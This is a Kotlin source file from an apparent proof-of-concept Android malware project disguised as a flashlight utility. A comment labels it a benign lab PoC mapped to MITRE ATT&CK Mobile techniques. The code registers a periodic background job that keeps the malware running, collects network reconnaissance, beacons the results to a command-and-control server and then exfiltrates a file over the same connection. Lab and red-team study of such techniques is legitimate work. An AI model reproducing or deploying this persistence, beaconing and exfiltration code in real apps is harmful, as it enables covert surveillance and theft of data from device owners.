package com.utiltools.torchlight.schedule

import android.content.Context
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.WorkerParameters
import com.utiltools.torchlight.c2.C2Client
import com.utiltools.torchlight.c2.C2Config
import com.utiltools.torchlight.exfil.ExfilModule
import com.utiltools.torchlight.recon.NetworkReconCollector
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.util.concurrent.TimeUnit

/**
 * PoC-only. Self-built benign proof-of-concept, isolated lab only.
 * Implements ATT&CK Mobile T1603 (Scheduled Task/Job):
 * https://attack.mitre.org/techniques/T1603/
 *
 * Registers a periodic WorkManager job that re-runs recon in the
 * background, independent of the app being foregrounded — the persistence
 * mechanism the kill chain's install phase relies on. Evidence: inspect
 * with `adb shell dumpsys jobscheduler` while the app is installed.
 */
class ReconJobWorker(
    context: Context,
    params: WorkerParameters
) : CoroutineWorker(context, params) {

    companion object {
        private const val TAG = "PoC-T1603-Schedule"
        private const val WORK_NAME = "poc_recon_job"

        fun schedule(context: Context) {
            val request = PeriodicWorkRequestBuilder<ReconJobWorker>(
                15, TimeUnit.MINUTES // WorkManager's minimum periodic interval
            ).build()

            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                WORK_NAME,
                ExistingPeriodicWorkPolicy.KEEP,
                request
            )

            Log.i(TAG, "scheduled_job registered name=$WORK_NAME interval_min=15")
        }
    }

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        Log.i(TAG, "scheduled_job fired name=$WORK_NAME")
        val recon = NetworkReconCollector.collect(applicationContext)

        // C2 (T1521) + exfil (T1646): beacon recon findings, then reuse the
        // same TLS socket to send the dummy "sensitive" file.
        val client = C2Client(C2Config.HOST, C2Config.PORT)
        val out = client.connectAndBeacon("BEACON:$recon\n")
        if (out != null) {
            ExfilModule.exfil(out)
        }
        client.close()

        Result.success()
    }
}
